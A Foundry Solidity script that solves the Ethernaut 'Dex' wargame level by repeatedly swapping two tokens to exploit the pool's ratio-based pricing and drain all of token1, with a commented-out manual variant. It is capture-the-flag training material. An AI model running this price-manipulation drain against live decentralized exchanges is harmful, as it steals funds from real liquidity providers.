// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IDex } from "ethernaut/22-dex/IDex.sol";

contract DexScript is Script {
    error UnexpectedSwapperBalances(uint256 balanceTkn1, uint256 balanceTkn2);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address dexAddr = vm.envAddress("L22_DEX_ADDRESS");
        IDex dex = IDex(dexAddr);

        // Step 1: deploy attacker
        address tkn1 = dex.token1();
        address tkn2 = dex.token2();

        address swapper = vm.addr(deployerPrivateKey);

        // STRATEGY 1: the smart way
        while (true) {
            // NB: it focuses on withdrawing all TKN1
            uint256 dexTkn1Balance = dex.balanceOf(tkn1, dexAddr);
            uint256 dexTkn2Balance = dex.balanceOf(tkn2, dexAddr);
            if (dexTkn1Balance == 0) break;
            uint256 swapperTkn1Balance = dex.balanceOf(tkn1, swapper);
            uint256 swapperTkn2Balance = dex.balanceOf(tkn2, swapper);
            // Initial case, amounts TKN1 == TKN2
            uint256 swapAmount;
            address tknFrom;
            address tknTo;
            if (swapperTkn1Balance == swapperTkn2Balance) {
                swapAmount = swapperTkn1Balance; // Any, as swapperTkn1Balance == swapperTkn2Balance
                tknFrom = tkn1;
                tknTo = tkn2;
            } else if (swapperTkn1Balance == 0) {
                // After 1st swap
                // NB: the amount of TKN2 in the pool determines the max swap amount
                swapAmount = swapperTkn2Balance > dexTkn2Balance ? dexTkn2Balance : swapperTkn2Balance;
                tknFrom = tkn2;
                tknTo = tkn1;
            } else if (swapperTkn2Balance == 0) {
                // After 2nd swap
                // NB: the amount of TKN1 in the pool determines the max swap amount
                swapAmount = swapperTkn1Balance > dexTkn1Balance ? dexTkn1Balance : swapperTkn1Balance;
                tknFrom = tkn1;
                tknTo = tkn2;
            } else {
                revert UnexpectedSwapperBalances(swapperTkn1Balance, swapperTkn2Balance);
            }
            dex.approve(dexAddr, swapAmount);
            dex.swap(tknFrom, tknTo, swapAmount);
            console.log("dex balances:");
            console.logUint(dex.balanceOf(tkn1, dexAddr));
            console.logUint(dex.balanceOf(tkn2, dexAddr));
            console.log("swapper balances:");
            console.logUint(dex.balanceOf(tkn1, swapper));
            console.logUint(dex.balanceOf(tkn2, swapper));
            console.log("swapAmount balances:");
            console.logUint(swapAmount);
        }

        // STRATEGY 2: a not so smart way
        // console.log("*** Before any swap");
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        // console.log("*** 1st swap");
        // dex.approve(dexAddr, 10);
        // dex.swap(tkn1, tkn2, 10);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));
        // console.log("swap price");
        // //uint256 swapPrice2 = dex.getSwapPrice(tkn1, tkn2, 10);
        // // console.logUint(swapPrice2);

        // console.log("*** 2nd swap");
        // dex.approve(dexAddr, 20);
        // dex.swap(tkn2, tkn1, 20);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        // console.log("*** 3rd swap");
        // dex.approve(dexAddr, 24);
        // dex.swap(tkn1, tkn2, 24);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        // console.log("*** 4th swap");
        // dex.approve(dexAddr, 30);
        // dex.swap(tkn2, tkn1, 30);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        // console.log("*** 5th swap");
        // dex.approve(dexAddr, 41);
        // dex.swap(tkn1, tkn2, 41);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        // console.log("*** 6th swap");
        // dex.approve(dexAddr, 45);
        // dex.swap(tkn2, tkn1, 45);
        // console.log("dex balances:");
        // console.logUint(dex.balanceOf(tkn1, dexAddr));
        // console.logUint(dex.balanceOf(tkn2, dexAddr));
        // console.log("swapper balances:");
        // console.logUint(dex.balanceOf(tkn1, swapper));
        // console.logUint(dex.balanceOf(tkn2, swapper));

        vm.stopBroadcast();
    }
}
